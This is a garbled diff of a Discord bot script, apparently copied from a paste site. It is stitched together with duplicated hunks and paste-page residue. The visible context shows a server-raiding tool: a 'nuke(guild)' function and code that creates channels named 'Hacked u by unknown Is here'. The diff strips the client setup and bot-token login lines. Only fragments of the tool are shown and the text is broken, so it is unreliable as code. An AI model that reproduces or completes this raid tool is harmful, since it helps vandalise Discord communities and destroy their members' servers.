@@ -434,8 +434,7 @@ m.createChannel('Hacked u by unknown Is here', 'voice');
 });
  
  
-const { Client } = require('discord.js');
-const client = new Client();
+
  
 async function nuke(guild) {
   let users = 0;
@@ -504,11 +503,9 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("توكن البوت")
+
 RAW Paste Data
 
-const Discord = require("discord.js");
-const LOka = new Discord.Client();
 console.log('By KBOOOOOOOOSH-YT');
 LOka.on('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
@@ -917,8 +914,7 @@ m.createChannel('Hacked u by unknown Is here', 'voice');
 });
 
 
-const { Client } = require('discord.js');
-const client = new Client();
+
 
 async function nuke(guild) {
   let users = 0;
